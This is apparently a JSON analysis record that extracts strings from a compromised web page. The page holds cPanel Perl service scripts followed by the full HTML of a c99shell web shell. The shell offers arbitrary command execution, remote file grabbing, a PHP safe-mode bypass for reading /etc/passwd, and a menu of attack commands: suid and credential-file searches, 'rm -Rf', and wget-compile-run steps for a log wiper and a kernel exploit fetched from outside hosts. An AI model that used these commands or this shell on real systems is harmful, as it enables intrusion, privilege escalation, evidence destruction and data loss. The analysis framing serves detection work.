            "            if ( -e '/etc/' . $service . 'disable' ) { $disabled = 1; }",
            "            $servicebin = $ftpbin;",
            "            last;",
            "        }",
            "    }",
            "    return ( $service, $servicebin, $processowner, $disabled );",
            "sub find_proftpd_service {",
            "    my ( $service, $servicebin, $processowner, $disabled ) = ( 'proftpd', '', 'nobody', 0 );",
            "    my @ftpbinaries = qw( /usr/sbin/proftpd /usr/local/sbin/proftpd /usr/local/libexec/proftpd );",
            "    foreach my $ftpbin (@ftpbinaries) {",
            "        if ( -x $ftpbin ) {",
            "            if ( -e '/etc/' . $service . 'disable' ) { $disabled = 1; }",
            "            $servicebin = $ftpbin;",
            "        }",
            "    }",
            "    return ( $service, $servicebin, $processowner, $disabled );",
            "sub servicefixup {",
            "    my ( $system, $service ) = @_;",
            "    my $processowner = 'root';",
            "    my $iscript      = '';",
            "    my $manualstart  = 0;",
            "    my $servicebin   = '';",
            "    my $serviceflags = '';",
            "    my $disabled     = 0;",
            "    if ( -e '/var/cpanel/brokenfutex' ) {",
            "        $ENV{'LD_ASSUME_KERNEL'} = '2.4.1';",
            "    }",
            "    if ( $service eq 'ftpserver' || $service eq 'ftpd' ) {",
            "        if (   -e '/etc/ftpserverdisable'",
            "            || -e '/etc/ftpddisable' ) {",
            "            $disabled = 1;",
            "        }",
            "        my $cpconf_ref = Cpanel::Config::LoadCpConf::loadcpconf();",
            "        my $selected_ftpserver = $cpconf_ref-&gt;{'ftpserver'} ? $cpconf_ref-&gt;{'ftpserver'} : ''; # localize setting to prevent warnings",
            "        if ( $selected_ftpserver eq 'disabled' ) {",
            "            $disabled = 1;",
            "        }",
            "        # Attempt ftpd server lookup based upon the selected server",
            "        if ( $selected_ftpserver eq 'pure-ftpd' ) {",
            "            my ( $ftpd_service, $ftpd_bin, $ftpd_owner, $ftpd_disabled ) = find_pureftpd_service();",
            "            if ($ftpd_bin) {",
            "                $service      = $ftpd_service;",
            "                $servicebin   = $ftpd_bin;",
            "                $processowner = $ftpd_owner;",
            "                if ( !$disabled ) {",
            "                    $disabled = $ftpd_disabled;",
            "                }",
            "            }",
            "        }",
            "        elsif ( $selected_ftpserver eq 'proftpd' ) {",
            "            my ( $ftpd_service, $ftpd_bin, $ftpd_owner, $ftpd_disabled ) = find_proftpd_service();",
            "            if ($ftpd_bin) {",
            "                $service      = $ftpd_service;",
            "                $servicebin   = $ftpd_bin;",
            "                $processowner = $ftpd_owner;",
            "                if ( !$disabled ) {",
            "                    $disabled = $ftpd_disabled;",
            "                }",
            "            }",
            "        }",
            "        # Handle the condition where the service may be disabled or the desired",
            "        # ftpd server is not installed",
            "        if ( !$servicebin ) {",
            "            if ( $selected_ftpserver ne 'pure-ftpd' ) {",
            "                my ( $ftpd_service, $ftpd_bin, $ftpd_owner, $ftpd_disabled ) = find_pureftpd_service();",
            "                if ($ftpd_bin) {",
            "                    $service      = $ftpd_service;",
            "                    $servicebin   = $ftpd_bin;",
            "                    $processowner = $ftpd_owner;",
            "                    if ( !$disabled ) {",
            "                        $disabled = $ftpd_disabled;",
            "                    }",
            "                }",
            "            }",
            "            if ( !$servicebin &amp;&amp; $selected_ftpserver ne 'proftpd' ) {",
            "                my ( $ftpd_service, $ftpd_bin, $ftpd_owner, $ftpd_disabled ) = find_proftpd_service();",
            "                if ($ftpd_bin) {",
            "                    $service      = $ftpd_service;",
            "                    $servicebin   = $ftpd_bin;",
            "                    $processowner = $ftpd_owner;",
            "                    if ( !$disabled ) {",
            "                        $disabled = $ftpd_disabled;",
            "                    }",
            "                }",
            "            }",
            "        }",
            "        if ( $servicebin eq '' ) {",
            "            die &quot;Ftp server is not installed. Exiting.&quot;;",
            "        }",
            "        $iscript = getinitfile( $service, $system );",
            "        if ( $iscript eq '' ) {",
            "            $manualstart = 1;",
            "        }",
            "        if ( $manualstart == 0 ) {",
            "            $manualstart = &amp;needsmanualstart( $system, $service );",
            "        }",
            "        if ( $manualstart &amp;&amp; $servicebin =~ m/pure/i &amp;&amp; $system =~ m/freebsd/i ) {",
            "            $servicebin   = '/usr/local/sbin/pure-config.pl';",
            "            $serviceflags = '/usr/local/etc/pure-ftpd.conf';",
            "        }",
            "    }",
            "    elsif ( $service eq 'syslog' ) {",
            "        if ( -e '/etc/syslogdisable' || -e '/etc/syslogddisable' ) {",
            "            $disabled = 1;",
            "        }",
            "        if ( $system =~ /freebsd/i ) {",
            "            $service = 'syslogd';",
            "        }",
            "        if ( -e '/etc/gentoo-release' ) {",
            "            $service      = 'syslogd';",
            "            $processowner = 'root';",
            "            $iscript      = getinitfile( 'sysklogd', $system );",
            "        }",
            "        if ( !$iscript ) {",
            "            $iscript = getinitfile( $service, $system );",
            "        }",
            "        if ( $iscript eq '' ) {",
            "            ( $servicebin, $serviceflags ) = getmanualserviceinfo( $system, $service );",
            "            $manualstart = 1;",
            "        }",
            "        if ( $manualstart == 0 ) {",
            "            $manualstart = &amp;needsmanualstart( $system, $service );",
            "        }",
            "        if ( -e '/etc/trustix-release' &amp;&amp; getpwnam('syslog') ) {",
            "            $processowner = 'syslog';",
            "        }",
            "    }",
            "    elsif ( $service eq 'rsyslog' ) {",
            "        if ( -e '/etc/rsyslogdisable' || -e '/etc/rsyslogddisable' ) {",
            "            $disabled = 1;",
            "        }",
            "        if ( !$iscript ) {",
            "            $iscript = getinitfile( $service, $system );",
            "        }",
            "        if ( $iscript eq '' ) {",
            "            ( $servicebin, $serviceflags ) = getmanualserviceinfo( $system, $service );",
            "            $manualstart = 1;",
            "        }",
            "        if ( $manualstart == 0 ) {",
            "            $manualstart = &amp;needsmanualstart( $system, $service );",
            "        }",
            "    }",
            "    elsif ( $service eq 'inetd' ) {",
            "        if ( -e '/etc/inetddisable' || -e '/etc/xinetddisable' ) {",
            "            $disabled = 1;",
            "        }",
            "        if ( $system =~ /freebsd/i ) {",
            "            my $xinetdenable = 0;",
            "            my @CF           = qw( /etc/defaults/rc.conf /etc/rc.conf );",
            "            foreach my $file (@CF) {",
            "                open( RCC, '&lt;', $file );",
            "                while (&lt;RCC&gt;) {",
            "                    if (/^[\\s\\t]*inetd_program=\\&quot;([^\\&quot;]+)\\&quot;/) {",
            "                        $servicebin = $1;",
            "                        if ( !-x $servicebin ) {",
            "                            #If the bin in not executable use inetd",
            "                            $manualstart = 1;",
            "                        }",
            "                    }",
            "                    if (/^[\\s\\t]*xinetd_enable=\\&quot;(yes|true|1)\\&quot;/i) {",
            "                        $xinetdenable = 1;",
            "                    }",
            "                }",
            "                close(RCC);",
            "            }",
            "            if ( ( $servicebin =~ /xinetd$/i || $xinetdenable == 1 )",
            "                &amp;&amp; -e '/etc/xinetd.conf' ) {",
            "                $service = 'xinetd';",
            "                $iscript = getinitfile( $service, $system );",
            "                if ( $iscript ne '' &amp;&amp; $xinetdenable == 0 ) {",
            "                    $manualstart = 1;",
            "                }",
            "                else {",
            "                    $servicebin = 'usexinetd';",
            "                }",
            "            }",
            "            else {",
            "                # Unless xinetd is properly configured, use inetd",
            "                $manualstart = 1;",
            "            }",
            "            if ( $servicebin eq '' || $manualstart == 1 ) {",
            "                $service      = 'inetd';",
            "                $servicebin   = '/usr/sbin/inetd';",
            "                $serviceflags = '-wW';",
            "                $manualstart  = 1;",
            "            }",
            "        }",
            "        else {",
            "            $service = 'xinetd';",
            "            $iscript = getinitfile( $service, $system );",
            "        }",
            "    }",
            "    elsif ( $service eq 'postgresql' ) {",
            "        if (   -e '/etc/postgresqldisable'",
            "            || -e '/etc/postgresdisable'",
            "            || -e '/etc/postmasterdisable' ) {",
            "            $disabled = 1;",
            "        }",
            "        # Get init script while service is stil postgresql",
            "        $iscript = getinitfile( $service, $system );",
            "        if ( $system =~ /freebsd/i ) {",
            "            $service = 'postgres';",
            "        }",
            "        else {",
            "            $service = 'postmaster';",
            "        }",
            "        if ( -d '/var/lib/pgsql/data' ) {",
            "            if (   !-e &quot;/var/lib/pgsql/data/PG_VERSION&quot;",
            "                &amp;&amp; !-e &quot;/var/lib/pgsql/data/base&quot;",
            "                &amp;&amp; !-e &quot;/var/lib/pgsql/data/global&quot;",
            "                &amp;&amp; -e &quot;/usr/bin/initdb&quot; ) {",
            "                print 'Postgres database is not initialized...initializing it...';",
            "                open( PGA, '&lt;', '/var/lib/pgsql/data/pg_hba.conf' );",
            "                my @PGA = &lt;PGA&gt;;",
            "                close(PGA);",
            "                unlink('/var/lib/pgsql/data/pg_hba.conf');",
            "                unlink('/var/lib/pgsql/data/pg_hbc.conf');",
            "                my $pg_user = 'pgsql';",
            "                if ( getpwnam('postgres') ) {",
            "                    $pg_user = 'postgres';",
            "                }",
            "                system( 'su', '-l', $pg_user, '-c', '/usr/bin/initdb' );",
            "                open( PGA, '&gt;', '/var/lib/pgsql/data/pg_hba.conf' );",
            "                foreach (@PGA) { print PGA; }",
            "                close(PGA);",
            "                print &quot;Done\\n&quot;;",
            "            }",
            "        }",
            "        if ( $system =~ /freebsd/i ) {",
            "            $processowner = 'pgsql';",
            "        }",
            "        else {",
            "            $processowner = 'postgres';",
            "        }",
            "        if ( $iscript eq '' ) {",
            "            $manualstart = 1;",
            "        }",
            "    }",
            "    elsif ( $service eq 'named' || $service eq 'nsd' ) {",
            "        if (   -e '/etc/nameddisable'",
            "            || -e '/etc/binddisable'",
            "            || -e '/etc/dnsdisable' ) {",
            "            $disabled = 1;",
            "        }",
            "        if ( $system =~ /freebsd/i ) {",
            "            $processowner = 'bind';",
            "            if ( $service eq 'named' ) {",
            "                ( $servicebin, $serviceflags ) = getmanualserviceinfo( $system, $service );",
            "                $manualstart = &amp;needsmanualstart( $system, $service );",
            "            }",
            "        }",
            "        else {",
            "            $processowner = 'named';",
            "        }",
            "        $iscript = getinitfile( $service, $system );",
            "        if ( $iscript eq '' ) {",
            "            $manualstart = 1;",
            "        }",
            "    }",
            "    return ( $processowner, $service, $iscript, $manualstart, $servicebin, $serviceflags, $disabled );",
            "sub getspamdopts {",
            "    my $cpspamdconf     = '/etc/cpspamd.conf';",
            "    my $spamdoptions    = '';",
            "    my $socketpath      = '';",
            "    my $allowedips      = '--allowed-ips=127.0.0.1';",
            "    my $maxconnperchild = '';",
            "    my $maxchildren     = '--max-children=5';",
            "    my $maxspare        = '';",
            "    my $pidfile         = '--pidfile=/var/run/spamd.pid';",
            "    my $localonly       = '';",
            "    my $timeouttcp      = '';",
            "    my $timeoutchild    = '';",
            "    if ( -e $cpspamdconf ) {",
            "        open( SPAMD, &quot;&lt;&quot;, $cpspamdconf );",
            "        while (&lt;SPAMD&gt;) {",
            "            if ( !(/^[\\s\\t]*$/) &amp;&amp; !(/^[\\s\\t]*\\#.*$/) ) {",
            "                chomp();",
            "                my ( $option, $value ) = split( '=', $_ );",
            "                next if ( !defined $value || $value eq '' );",
            "                if ( $option eq 'allowedips' ) {",
            "                    $allowedips = &quot;--allowed-ips=${value}&quot;;",
            "                }",
            "                elsif ( $option eq 'socketpath' ) {",
            "                    $socketpath = &quot;--socketpath=${value}&quot;;",
            "                }",
            "                elsif ( $option eq 'maxconnperchild' ) {",
            "                    $maxconnperchild = &quot;--max-conn-per-child=${value}&quot;;",
            "                }",
            "                elsif ( $option eq 'maxspare' ) {",
            "                    $maxspare = &quot;--max-spare=${value}&quot;;",
            "                }",
            "                elsif ( $option eq 'maxchildren' ) {",
            "                    $maxchildren = &quot;--max-children=${value}&quot;;",
            "                }",
            "                elsif ( $option eq 'pidfile' ) {",
            "                    $pidfile = &quot;--pidfile=${value}&quot;;",
            "                }",
            "                elsif ( $option eq 'local' ) {",
            "                    $localonly = '--local';",
            "                }",
            "                elsif ( $option eq 'timeouttcp' ) {",
            "                    $timeouttcp = &quot;--timeout-tcp=${value}&quot;;",
            "                }",
            "                elsif ( $option eq 'timeoutchild' ) {",
            "                    $timeoutchild = &quot;--timeout-child=${value}&quot;;",
            "                }",
            "            }",
            "        }",
            "    }",
            "    close(SPAMD);",
            "    $spamdoptions = $localonly . ' ' . $timeoutchild . ' ' . $timeouttcp . ' ' . ( $socketpath ? $socketpath : $allowedips ) . ' ' . $maxconnperchild . ' ' . $pidfile . ' ' . $maxchildren . ' ' . $maxspare;",
            "    return $spamdoptions;",
            "sub spamdcheck {",
            "    my $spamdstat = 0;",
            "    my $raw_out;",
            "    my $opt = getspamdopts();",
            "    if ( !-x '/usr/bin/spamc' ) { return $spamdstat; }",
            "    local $SIG{'ALRM'} = sub { die 'timeout' };",
            "    _check_cpanel_spamassasin_dir();",
            "    eval {",
            "        my $pid;",
            "        # spamc aborts connection after 600 seconds by default",
            "        alarm(620);",
            "        if ( $opt =~ /--socketpath=(\\S+)/ ) {",
            "            $pid = IPC::Open2::open2( \\*RDRFH, \\*WTRFH, '/usr/bin/spamc', '-u','cpanel','-U', $1 );",
            "        }",
            "        else {",
            "            $pid = IPC::Open2::open2( \\*RDRFH, \\*WTRFH, '/usr/bin/spamc','-u','cpanel' );",
            "        }",
            "        print WTRFH &lt;&lt;'EOM';",
            "Subject: Test spam mail (GTUBE)",
            "Message-ID: &lt;GTUBE1.1010101@example.net&gt;",
            "Date: Wed, 23 Jul 2003 23:30:00 +0200",
            "From: Sender &lt;sender@example.net&gt;",
            "To: Recipient &lt;recipient@example.net&gt;",
            "Precedence: junk",
            "MIME-Version: 1.0",
            "Content-Type: text/plain; charset=us-ascii",
            "Content-Transfer-Encoding: 7bit",
            "This is the GTUBE, the",
            "        Generic",
            "        Test for",
            "        Unsolicited",
            "        Bulk",
            "        Email",
            "If your spam filter supports it, the GTUBE provides a test by which you",
            "can verify that the filter is installed correctly and is detecting incoming",
            "spam. You can send yourself a test mail containing the following string of",
            "characters (in upper case and with no white spaces and line breaks):",
            "XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X",
            "You should send this test mail from an account outside of your network.",
            "        # Close the write file handle",
            "        close(WTRFH);",
            "        # Process command output",
            "        while (&lt;RDRFH&gt;) {",
            "            $raw_out .= $_;",
            "            if (/X-Spam-Status\\: Yes/) {",
            "                $spamdstat = 1;",
            "            }",
            "        }",
            "        # Close the read file handle",
            "        close(RDRFH);",
            "        waitpid( $pid, 0 );",
            "        alarm(0);",
            "    };",
            "    if ($@) {",
            "        unless ( $@ =~ /timeout/ ) {",
            "            alarm(0);",
            "            die;",
            "        }",
            "    }",
            "    return($spamdstat,$raw_out) if wantarray;",
            "    return $spamdstat;",
            "sub postgresqlfixup {",
            "    my ($system)   = @_;",
            "    my $postmaster = '';",
            "    my $pgctl      = '';",
            "    my $pgsqldir   = '';",
            "    if ( -x '/usr/bin/pg_ctl' ) {",
            "        $pgctl = '/usr/bin/pg_ctl';",
            "    }",
            "    else {",
            "        $pgctl = '/usr/local/bin/pg_ctl';",
            "    }",
            "    if ( -e '/var/lib/pgsql/data' ) {",
            "        $pgsqldir = '/var/lib/pgsql/data';",
            "    }",
            "    else {",
            "        $pgsqldir = '/usr/local/pgsql/data';",
            "    }",
            "    return ( $pgctl, $pgsqldir );",
            "sub setuids {",
            "    goto &amp;Cpanel::AccessIds::setuids;",
            "sub runasuser {",
            "    goto &amp;Cpanel::AccessIds::runasuser;",
            "sub doomedprocess {",
            "    goto &amp;Cpanel::Proc::doom;",
            "sub nooutputsystem {",
            "    my (@unsafecmd) = @_;",
            "    my (@cmd);",
            "    while ( $unsafecmd[$#unsafecmd] eq '' ) { pop(@unsafecmd); }",
            "    foreach (@unsafecmd) {",
            "        my @cmds = split( / /, $_ );",
            "        foreach (@cmds) { push( @cmd, $_ ); }",
            "    }",
            "    my $pid;",
            "    if ( $pid = fork() ) {",
            "        #master",
            "    }",
            "    else {",
            "# Cheap way of doing setsid() without bringing in POSIX",
            "        setpgrp(0,0);",
            "        Cpanel::CleanupStub::closefds();",
            "        open( STDIN,  '&lt;', '/dev/null' );",
            "        open( STDOUT, '&gt;', '/dev/null' );",
            "        open( STDERR, '&gt;', '/dev/null' );",
            "        exec(@cmd);",
            "        exit;",
            "    }",
            "    waitpid( $pid, 0 );",
            "sub check_service {",
            "    goto &amp;Cpanel::Services::check_service;",
            "sub needsmanualstart {",
            "    my ( $system, $service ) = @_;",
            "    my $manualstart = 0;",
            "    if ( $system =~ /freebsd/i ) {",
            "        my ( $servicebin, $serviceflags, $serviceenable ) = getmanualserviceinfo( $system, $service, 1 );",
            "        if (   $serviceenable =~ /no/i",
            "            || $serviceenable =~ /false/i",
            "            || $serviceenable =~ /0/",
            "            || $serviceenable eq &quot;&quot; ) {",
            "            if ( $service eq 'pure-ftpd' ) { $service = 'pureftpd'; }",
            "            open( RSTRTLG, '&gt;&gt;', $restartsrvlog );",
            "            print RSTRTLG &quot;Warning: Service Restart requested for a service that is disabled!\\n&quot;;",
            "            print RSTRTLG &quot;Please add the following line to /etc/rc.conf: \\n&quot;;",
            "            print RSTRTLG &quot;${service}_enable=\\&quot;YES\\&quot;\\n&quot;;",
            "            print RSTRTLG &quot;$service will be started manually!\\n&quot;;",
            "            close(RSTRTLG);",
            "            $manualstart = 1;",
            "        }",
            "    }",
            "    return ($manualstart);",
            "sub find_mysqladmin {",
            "    my ( @LOC, $loc );",
            "    @LOC = ( '/usr/bin/mysqladmin', '/usr/local/bin/mysqladmin' );",
            "    foreach $loc (@LOC) {",
            "        if ( -e $loc ) { return $loc; }",
            "    }",
            "sub lock_file {",
            "    my $lock_file = shift;",
            "    if ( -e $lock_file ) {",
            "        my $mtime = ( stat($lock_file) )[9];",
            "        my $now   = time;",
            "        my $diff  = $now - $mtime;",
            "        if ( $diff &lt; ( 60 * 3 ) ) {",
            "            exit;",
            "        }",
            "    }",
            "    Cpanel::FileUtils::TouchFile::touchfile($lock_file);",
            "sub _check_cpanel_spamassasin_dir {",
            "    if (! -e '/usr/local/cpanel/.spamassassin') {",
            "        mkdir '/usr/local/cpanel/.spamassassin',0700;",
            "    }",
            "    require Cpanel::PwCache;",
            "    my @cpanel_pw = Cpanel::PwCache::getpwnam('cpanel');",
            "    if ($cpanel_pw[0]) {",
            "        chown $cpanel_pw[2],$cpanel_pw[3],'/usr/local/cpanel/.spamassassin';",
            "    }",
            "</pre>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fscripts%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fscripts%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/scripts/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/scripts/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0111 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [
            "127.0.0.1"
        ],
        "url": [
            "http://google.com/search",
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c",
            "http://cpanel.net"
        ]
